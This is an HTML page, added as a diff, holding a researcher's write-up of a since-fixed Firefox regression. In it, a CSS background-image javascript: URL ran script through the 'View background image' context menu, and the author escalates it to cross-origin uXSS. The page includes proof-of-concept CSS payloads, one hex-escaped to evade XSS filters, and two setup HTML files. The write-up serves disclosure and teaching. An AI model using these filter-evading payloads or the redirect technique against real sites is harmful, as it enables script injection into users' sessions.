@@ -1,0 +1,92 @@
+<!doctype html>
+<html>
+<head>
+	<title>Firefox uXSS and CSS XSS - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css?q" rel="stylesheet">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="https://leucosite.com/" />
+<meta name="twitter:title" content="Firefox uXSS and CSS XSS" />
+<meta name="twitter:creator" content="@qab">
+<meta name="twitter:description" content="CSS XSS came back for a bit which lead to an unusual uXSS" />
+<meta name="twitter:image" content="https://leucosite.com/qimg/Art16.png" />
+<style>#qWriteup p{white-space: pre-wrap;}</style>
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/> 
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+</div>
+</div>
+<div id="qWriteup">
+<h1>Firefox uXSS and CSS XSS</h1>
+<br>
+
+<p>An old bug that was first <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2006-34/" rel="noopener" target="_blank">found back in 2006</a> came back to visit. This regression brought back very old XSS vectors, specifically, CSS based XSS. Originally this was marked low severity, but not soon after did I manage to turn it into a uXSS making it high severity. Here's how.  </p>
+
+<h2>The regression</h2>
+<p>The <code>javascript:</code> URI scheme is a neat way to execute javascript using a URL. Whether it be in an anchor tag, iframe or bookmark. But did you know that once upon a time, you could execute javascript URI through an image source?
+
+This is a very old XSS vector that affected mostly IE back in the early 2000s. This required the user to open the context menu and click on <code>'View image'</code>. But what about other context menu items?
+</p>
+<h2>XSS through CSS</h2>
+<p>Mozilla employee <a href="https://twitter.com/kingstontime" target="_blank" rel="noopener">Jonathan Kingston</a> pointed out that the <code>View background image</code> context menu item was affected as well. This meant that we can use pure CSS to perform an XSS!
+
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;style&gt;img</span>{<span style="color: #008800; font-weight: bold">background-image</span><span style="color: #333333">:</span><span style="color: #DD2200; background-color: #fff0f0">url(&#39;javascript:alert(location)</span><span style="color: #FF0000; background-color: #FFAAAA">&#39;</span>)}<span style="color: #007700">&lt;/style&gt;</span>
+
+To further evade any XSS filters:
+
+<span style="color: #007700">&lt;style&gt;</span><span style="color: #333333">*</span>{<span style="color: #008800; font-weight: bold">background-image</span><span style="color: #333333">:</span><span style="color: #DD2200; background-color: #fff0f0">url(&#39;\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29&#39;)</span>}<span style="color: #007700">&lt;/style&gt;</span>
+</pre></div>
+</p>
+<h2>Turning it into uXSS</h2>
+<p>One of the interesting behaviors of context menus is that once you open it, it will persist once you navigate to a different website. What's weirder is that if you, for example, open the context menu from <code>'a.com'</code> and then the browser redirects to <code>'b.com'</code>, you will notice that when you click on <code>View source</code> it will open <code>'view-source:b.com'</code> which is the current window.
+
+So, even though you open the context menu, it will execute on whatever website you are on despite origin. So to set this up, we ask a user to click a button that opens the cross origin 'victim' website. After that, we will redirect to our website populating navigation history with our target website. Finally, we listen to when a user opens the context menu using <code>'oncontextmenu'</code> and execute <code>'history.back()'</code> taking us to the target website. Once the user clicks <code>View background image</code> javascript is executed. Interestingly, this acts like a bookmark which means it bypasses CSP and noscript (a non-JS PoC can be done.)
+
+<b>xssSetup.html</b> (I am using <code>https://addons.mozilla.org/%00 to get a relatively quicker loding page, not required.)
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;button</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;qbutt&quot;</span><span style="color: #007700">&gt;</span>click me<span style="color: #007700">&lt;/button&gt;</span>
+
+<span style="color: #007700">&lt;script&gt;</span>
+<span style="color: #008800; font-weight: bold">var</span> qwin;
+
+qbutt.onclick<span style="color: #333333">=</span>e<span style="color: #333333">=&gt;</span>{
+	qwin<span style="color: #333333">=</span>open(<span style="background-color: #fff0f0">&#39;https://addons.mozilla.org/%00&#39;</span>,<span style="background-color: #fff0f0">&#39;qab&#39;</span>);
+	
+	setTimeout(<span style="color: #008800; font-weight: bold">function</span>(){
+		open(<span style="background-color: #fff0f0">&#39;imgXss.html&#39;</span>,<span style="background-color: #fff0f0">&#39;qab&#39;</span>)
+	},<span style="color: #0000DD; font-weight: bold">1000</span>)
+}
+<span style="color: #007700">&lt;/script&gt;</span>
+</pre></div>
+
+<br>
+<b>imgXss.html</b>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;style&gt;</span><span style="color: #333333">*</span>{<span style="color: #008800; font-weight: bold">background-image</span><span style="color: #333333">:</span><span style="color: #DD2200; background-color: #fff0f0">url(&#39;javascript:alert(location)</span><span style="color: #FF0000; background-color: #FFAAAA">&#39;</span>)}<span style="color: #007700">&lt;/style&gt;</span>
+
+<span style="color: #007700">&lt;b&gt;</span> Right click, wait for redirection then click &#39;view background image&#39;<span style="color: #007700">&lt;/b&gt;</span>
+
+<span style="color: #007700">&lt;script&gt;</span>
+<span style="color: #007020">window</span>.oncontextmenu<span style="color: #333333">=</span>e<span style="color: #333333">=&gt;</span>{
+	setTimeout(<span style="background-color: #fff0f0">&quot;history.back()&quot;</span>,<span style="color: #0000DD; font-weight: bold">100</span>)
+}
+<span style="color: #007700">&lt;/script&gt;</span>
+</pre></div>
+<br>
+<b>Video:</b>
+<br><video loop="" controls><source type="video/mp4" src="//i.imgur.com/SiNadrn.mp4"></video><br>
+Mozilla swiftly fixed this issue and so it no longer works. But it sure was a fun find.
+</p>
+<h2>References:</h2>
+<b>The report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1465160" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1465160</a>
+</p>
+
+
+</div>
+
+</body>
+</html>
